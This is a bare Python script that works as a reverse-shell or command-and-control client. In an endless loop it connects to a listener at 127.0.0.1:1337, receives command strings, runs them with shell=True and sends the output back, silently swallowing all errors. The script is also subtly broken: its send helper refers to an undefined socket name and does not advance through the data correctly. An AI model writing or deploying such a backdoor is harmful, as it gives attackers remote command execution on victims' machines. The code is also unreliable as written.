from socket import socket
from contextlib import suppress
from subprocess import run, PIPE
def sendall(data):
    chunk = data[:30000]
    data = data[30000:]
    while chunk:
        other.sendall(chunk)
        chunk = data[:30000]
data = b' '
while True:
    with suppress(Exception):
        s = socket()
        s.connect(('127.0.0.1', 1337))
        sendall(data)
        command = s.recv(65535).decode()
        p = run(command, shell=True, stdout=PIPE, stderr=PIPE)
        data = p.stdout or p.stderr or b' '
        s.close()
